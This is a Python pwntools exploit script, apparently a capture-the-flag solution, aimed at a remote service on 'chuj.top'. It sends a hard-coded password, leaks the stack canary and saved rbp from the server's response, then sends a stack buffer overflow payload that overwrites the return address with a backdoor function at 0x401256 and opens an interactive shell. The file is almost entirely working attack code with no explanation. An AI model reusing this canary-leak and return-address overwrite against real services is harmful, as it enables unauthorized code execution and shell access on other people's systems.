# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]

io = remote('chuj.top', 50610) #nc chuj.top 34698
# libc = ELF('./libc-2.31.so')
# io = process('a.out')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

	
# backdoor = 0x401256
#0xb0361e0e8294f147	0x8c09e0c34ed8a6a9
# dbg()
# pause()
sa('pass word\n',p64(0xb0361e0e8294f147)+p64(0x8c09e0c34ed8a6a9))
# irt()
rev = rn(0x100)
canary = uu64(rev[0x18:0x20])
lg('canary')
rbp = uu64(rev[0x20:0x28])
lg('rbp')
backdoor = 0x401256
pay = 0x18*'a' + p64(canary) + p64(rbp) + p64(backdoor)
sn(pay)
irt()


